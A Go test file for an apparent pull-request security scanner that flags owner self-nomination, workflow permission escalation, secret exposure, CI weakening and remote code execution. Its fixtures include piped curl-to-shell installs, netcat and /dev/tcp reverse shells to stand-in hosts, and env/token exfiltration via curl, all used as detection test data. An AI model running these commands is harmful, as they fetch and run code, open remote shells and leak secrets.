package sentinel

import (
	"reflect"
	"strings"
	"testing"
)

func patch(added, removed []string) string {
	var b strings.Builder
	b.WriteString("--- a/x\n+++ b/x\n@@ -1,3 +1,3 @@\n context\n")
	for _, l := range removed {
		b.WriteString("-" + l + "\n")
	}
	for _, l := range added {
		b.WriteString("+" + l + "\n")
	}
	return b.String()
}

func rulesOf(findings []Finding) []string { return Rules(findings) }

func has(findings []Finding, rule string) bool {
	for _, f := range findings {
		if f.Rule == rule {
			return true
		}
	}
	return false
}

func TestEvaluateCleanPRHasNoFindings(t *testing.T) {
	pr := PR{Author: "alice", Files: []File{
		{Path: "pkg/foo/foo.go", Status: "modified", Additions: 3, Deletions: 1, Patch: patch([]string{"x := 1"}, nil)},
		{Path: "pkg/foo/foo_test.go", Status: "modified", Additions: 10, Deletions: 2},
	}}
	if got := Evaluate(pr, Config{}); got != nil {
		t.Fatalf("expected no findings, got %+v", got)
	}
}

func TestEvaluateNoFilesOrExemptAuthor(t *testing.T) {
	if got := Evaluate(PR{Author: "a"}, Config{}); got != nil {
		t.Fatalf("no files should yield nil, got %+v", got)
	}
	pr := PR{Author: "Trusted-Bot", Files: []File{{Path: "OWNERS", Status: "modified"}}}
	if got := Evaluate(pr, Config{ExemptLogins: []string{" trusted-bot "}}); got != nil {
		t.Fatalf("exempt author should yield nil, got %+v", got)
	}
	if (Config{ExemptLogins: []string{""}}).Exempt("") {
		t.Fatal("empty author must never be exempt")
	}
}

func TestOwnerSelfNomination(t *testing.T) {
	p := patch([]string{"  - vjymisal0"}, nil)
	pr := PR{Author: "vjymisal0", Files: []File{{Path: "OWNERS", Status: "modified", Additions: 1, Patch: p}}}
	got := Evaluate(pr, Config{})
	if !has(got, RuleOwnerSelfNomination) || !has(got, RuleSensitivePath) {
		t.Fatalf("expected self-nomination + sensitive path, got %v", rulesOf(got))
	}
	for _, f := range got {
		if f.Rule == RuleOwnerSelfNomination && !strings.Contains(f.Summary, "@vjymisal0") {
			t.Fatalf("summary should name the author: %q", f.Summary)
		}
	}

	// Someone else nominating them is not self-nomination.
	pr.Author = "clubanderson"
	if got := Evaluate(pr, Config{}); has(got, RuleOwnerSelfNomination) {
		t.Fatalf("other author should not trip self-nomination: %v", rulesOf(got))
	}

	// Substring of a longer login must not match.
	pr = PR{Author: "bob", Files: []File{{Path: "docs/OWNERS", Patch: patch([]string{"  - bobby-tables"}, nil)}}}
	if got := Evaluate(pr, Config{}); has(got, RuleOwnerSelfNomination) {
		t.Fatalf("substring login must not match: %v", rulesOf(got))
	}

	// CODEOWNERS @-mention form.
	pr = PR{Author: "Bob", Files: []File{{Path: ".github/CODEOWNERS", Patch: patch([]string{"* @bob @alice"}, nil)}}}
	if got := Evaluate(pr, Config{}); !has(got, RuleOwnerSelfNomination) {
		t.Fatalf("@-mention should match case-insensitively: %v", rulesOf(got))
	}

	// Empty author never matches.
	if f := checkOwnerSelfNomination(PR{Files: []File{{Path: "OWNERS", Patch: patch([]string{"- x"}, nil)}}}, Config{}); f != nil {
		t.Fatal("empty author should not match")
	}
}

func TestMentionsLogin(t *testing.T) {
	cases := []struct {
		line, login string
		want        bool
	}{
		{"- alice", "alice", true},
		{"* @alice", "alice", true},
		{"alice:", "alice", true},
		{"malice", "alice", false},
		{"alice2", "alice", false},
		{"", "alice", false},
		{"alicealice alice", "alice", true},
	}
	for _, c := range cases {
		if got := mentionsLogin(c.line, c.login); got != c.want {
			t.Errorf("mentionsLogin(%q,%q)=%v want %v", c.line, c.login, got, c.want)
		}
	}
}

func TestPermissionEscalation(t *testing.T) {
	for _, line := range []string{
		"permissions: write-all",
		"  contents: write",
		"      id-token: write",
		"on: pull_request_target",
		"  pull_request_target:",
	} {
		pr := PR{Author: "a", Files: []File{{Path: ".github/workflows/ci.yml", Patch: patch([]string{line}, nil)}}}
		if got := Evaluate(pr, Config{}); !has(got, RulePermissionEscalation) {
			t.Errorf("%q should trip permission_escalation: %v", line, rulesOf(got))
		}
	}
	// Read permission, or the same line outside a workflow, is fine.
	pr := PR{Author: "a", Files: []File{
		{Path: ".github/workflows/ci.yml", Patch: patch([]string{"  contents: read"}, nil)},
		{Path: "docs/perm.yaml", Patch: patch([]string{"contents: write"}, nil)},
	}}
	if got := Evaluate(pr, Config{}); has(got, RulePermissionEscalation) {
		t.Fatalf("read-only / non-workflow should not trip: %v", rulesOf(got))
	}
}

func TestSecretExposure(t *testing.T) {
	trip := []string{
		`run: echo "${{ secrets.GITHUB_TOKEN }}"`,
		`run: curl -d "$TOKEN" https://evil.example`,
		`run: echo ${{ toJSON(secrets) }} | base64`,
		`run: printenv`,
		`run: env | curl -X POST --data-binary @- https://x`,
	}
	for _, line := range trip {
		pr := PR{Author: "a", Files: []File{{Path: ".github/workflows/ci.yml", Patch: patch([]string{line}, nil)}}}
		got := Evaluate(pr, Config{})
		// `curl -d "$TOKEN"` has no secrets. reference so it alone must not trip.
		want := strings.Contains(line, "secrets") || strings.Contains(line, "printenv") || strings.Contains(line, "env |")
		if has(got, RuleSecretExposure) != want {
			t.Errorf("%q: secret_exposure=%v want %v", line, has(got, RuleSecretExposure), want)
		}
	}
	// Passing a secret to an action input is normal.
	pr := PR{Author: "a", Files: []File{{Path: ".github/workflows/ci.yml", Patch: patch([]string{`  token: ${{ secrets.GITHUB_TOKEN }}`}, nil)}}}
	if got := Evaluate(pr, Config{}); has(got, RuleSecretExposure) {
		t.Fatalf("action input should not trip: %v", rulesOf(got))
	}
}

func TestCIGateWeakening(t *testing.T) {
	// Softening additions.
	for _, line := range []string{"continue-on-error: true", "run: make test || true", "        if: false", "git commit --no-verify", "exit 0"} {
		pr := PR{Author: "a", Files: []File{{Path: ".github/workflows/ci.yml", Patch: patch([]string{line}, nil)}}}
		if got := Evaluate(pr, Config{}); !has(got, RuleCIGateWeakening) {
			t.Errorf("%q should trip ci_gate_weakening: %v", line, rulesOf(got))
		}
	}
	// Deleting a workflow file.
	pr := PR{Author: "a", Files: []File{{Path: ".github/workflows/security.yml", Status: "removed"}}}
	if got := Evaluate(pr, Config{}); !has(got, RuleCIGateWeakening) {
		t.Fatalf("removed workflow should trip: %v", rulesOf(got))
	}
	// Removing several gate lines without replacement.
	pr = PR{Author: "a", Files: []File{{Path: "Makefile", Patch: patch(nil, []string{"\tgo vet ./...", "\tgolangci-lint run", "\t./scripts/coverage-gate.sh"})}}}
	if got := Evaluate(pr, Config{}); !has(got, RuleCIGateWeakening) {
		t.Fatalf("removing %d gate lines should trip: %v", ciRemovedLineThreshold, rulesOf(got))
	}
	// One removed line is refactoring, not weakening.
	pr = PR{Author: "a", Files: []File{{Path: "Makefile", Patch: patch([]string{"\tgo vet ./pkg/..."}, []string{"\tgo vet ./..."})}}}
	if got := Evaluate(pr, Config{}); has(got, RuleCIGateWeakening) {
		t.Fatalf("single gate line swap should not trip: %v", rulesOf(got))
	}
	// Same text outside CI files is ignored.
	pr = PR{Author: "a", Files: []File{{Path: "cmd/x/main.go", Patch: patch([]string{"// continue-on-error: true"}, nil)}}}
	if got := Evaluate(pr, Config{}); has(got, RuleCIGateWeakening) {
		t.Fatalf("non-CI file should not trip: %v", rulesOf(got))
	}
}

func TestTestRemoval(t *testing.T) {
	pr := PR{Author: "a", Files: []File{{Path: "pkg/x/x_test.go", Status: "removed", Deletions: 5}}}
	got := Evaluate(pr, Config{})
	if !has(got, RuleTestRemoval) {
		t.Fatalf("removed test file should trip: %v", rulesOf(got))
	}
	// Gutting: many deletions, few additions.
	pr = PR{Author: "a", Files: []File{{Path: "tests/e2e.spec.ts", Status: "modified", Additions: 2, Deletions: 60}}}
	if got := Evaluate(pr, Config{}); !has(got, RuleTestRemoval) {
		t.Fatalf("gutted test file should trip: %v", rulesOf(got))
	}
	// Refactor with balanced churn is fine.
	pr = PR{Author: "a", Files: []File{{Path: "tests/e2e.spec.ts", Status: "modified", Additions: 40, Deletions: 60}}}
	if got := Evaluate(pr, Config{}); has(got, RuleTestRemoval) {
		t.Fatalf("balanced test churn should not trip: %v", rulesOf(got))
	}
	// Small deletion below the floor is fine.
	pr = PR{Author: "a", Files: []File{{Path: "pkg/x/x_test.go", Status: "modified", Additions: 0, Deletions: 10}}}
	if got := Evaluate(pr, Config{}); has(got, RuleTestRemoval) {
		t.Fatalf("small deletion should not trip: %v", rulesOf(got))
	}
}

func TestSecurityPolicyEdit(t *testing.T) {
	for _, p := range []string{"SECURITY.md", ".github/dependabot.yml", ".github/codeql/config.yml", ".github/rulesets/main.json", "githooks/pre-commit", ".pre-commit-config.yaml"} {
		pr := PR{Author: "a", Files: []File{{Path: p, Status: "modified"}}}
		if got := Evaluate(pr, Config{}); !has(got, RuleSecurityPolicyEdit) {
			t.Errorf("%s should trip security_policy_edit: %v", p, rulesOf(got))
		}
	}
	pr := PR{Author: "a", Files: []File{{Path: "docs/security-overview.md"}}}
	if got := Evaluate(pr, Config{}); has(got, RuleSecurityPolicyEdit) {
		t.Fatalf("unrelated doc should not trip: %v", rulesOf(got))
	}
}

func TestRemoteCodeExecution(t *testing.T) {
	trip := []string{
		`curl -fsSL https://x.example/i.sh | sh`,
		`wget -qO- https://x | sudo bash`,
		`eval $(echo aGk= | base64 -d)`,
		`echo payload | base64 --decode | sh`,
		`nc evil.example 4444 -e /bin/sh`,
		`bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`,
		`-----BEGIN RSA PRIVATE KEY-----`,
		`aws_key = "AKIAABCDEFGHIJKLMNOP"`,
		`chmod 4755 /usr/bin/thing`,
		`export LD_PRELOAD=/tmp/x.so`,
	}
	for _, line := range trip {
		pr := PR{Author: "a", Files: []File{{Path: "scripts/setup.sh", Patch: patch([]string{line}, nil)}}}
		if got := Evaluate(pr, Config{}); !has(got, RuleRemoteCodeExecution) {
			t.Errorf("%q should trip remote_code_execution: %v", line, rulesOf(got))
		}
	}
	// Docs showing an install one-liner are excluded.
	pr := PR{Author: "a", Files: []File{{Path: "README.md", Patch: patch([]string{"curl -fsSL https://x/install.sh | sh"}, nil)}}}
	if got := Evaluate(pr, Config{}); has(got, RuleRemoteCodeExecution) {
		t.Fatalf("README should not trip: %v", rulesOf(got))
	}
	// Ordinary curl without a shell sink is fine.
	pr = PR{Author: "a", Files: []File{{Path: "scripts/fetch.sh", Patch: patch([]string{"curl -fsSL https://x/data.json -o data.json"}, nil)}}}
	if got := Evaluate(pr, Config{}); has(got, RuleRemoteCodeExecution) {
		t.Fatalf("plain curl should not trip: %v", rulesOf(got))
	}
}

func TestSensitivePathDefaultsAndOverride(t *testing.T) {
	pr := PR{Author: "a", Files: []File{{Path: "deploy/hub/values.yaml"}, {Path: "pkg/x.go"}}}
	got := Evaluate(pr, Config{})
	if !has(got, RuleSensitivePath) {
		t.Fatalf("deploy/** should be sensitive by default: %v", rulesOf(got))
	}
	for _, f := range got {
		if f.Rule == RuleSensitivePath && !reflect.DeepEqual(f.Paths, []string{"deploy/hub/values.yaml"}) {
			t.Fatalf("paths should list only the match: %v", f.Paths)
		}
	}
	// Operator override replaces the defaults entirely.
	if got := Evaluate(pr, Config{SensitivePaths: []string{"secrets/**"}}); has(got, RuleSensitivePath) {
		t.Fatalf("override should drop deploy/**: %v", rulesOf(got))
	}
	// An explicit empty list disables path matching without disabling the rule.
	if got := Evaluate(pr, Config{SensitivePaths: []string{}}); has(got, RuleSensitivePath) {
		t.Fatalf("empty override should match nothing: %v", rulesOf(got))
	}
}

func TestDisabledRules(t *testing.T) {
	pr := PR{Author: "a", Files: []File{{Path: "OWNERS", Patch: patch([]string{"- a"}, nil)}}}
	got := Evaluate(pr, Config{Disabled: []string{RuleSensitivePath, " OWNER_SELF_NOMINATION "}})
	if len(got) != 0 {
		t.Fatalf("both rules disabled, got %v", rulesOf(got))
	}
}

func TestFindingsAreOrderedAndRulesHelper(t *testing.T) {
	pr := PR{Author: "a", Files: []File{
		{Path: "scripts/x.sh", Patch: patch([]string{"curl x | sh"}, nil)},
		{Path: "SECURITY.md"},
		{Path: ".github/workflows/ci.yml", Patch: patch([]string{"permissions: write-all"}, nil)},
	}}
	got := Rules(Evaluate(pr, Config{}))
	want := []string{RuleSensitivePath, RulePermissionEscalation, RuleSecurityPolicyEdit, RuleRemoteCodeExecution}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("order: got %v want %v", got, want)
	}
	if Rules(nil) == nil || len(Rules(nil)) != 0 {
		t.Fatal("Rules(nil) should be an empty non-nil slice")
	}
}

func TestDiffLinesSkipsHeadersAndFences(t *testing.T) {
	p := "--- a/f\n+++ b/f\n@@ -1 +1 @@\n+```sh\n+curl x | sh\n+```\n-old\n context\n"
	if got := addedLines(p); !reflect.DeepEqual(got, []string{"curl x | sh"}) {
		t.Fatalf("addedLines=%q", got)
	}
	if got := removedLines(p); !reflect.DeepEqual(got, []string{"old"}) {
		t.Fatalf("removedLines=%q", got)
	}
	if addedLines("") != nil {
		t.Fatal("empty patch should yield nil")
	}
}

func TestRuleMetadataComplete(t *testing.T) {
	for _, r := range AllRules {
		if RuleDescriptions[r] == "" {
			t.Errorf("rule %s has no description", r)
		}
	}
	if len(RuleDescriptions) != len(AllRules) {
		t.Fatalf("descriptions=%d rules=%d", len(RuleDescriptions), len(AllRules))
	}
	if len(DefaultSensitivePaths) == 0 {
		t.Fatal("defaults must not be empty")
	}
	if got := uniq([]string{"b", "a", "b"}); !reflect.DeepEqual(got, []string{"a", "b"}) {
		t.Fatalf("uniq=%v", got)
	}
}
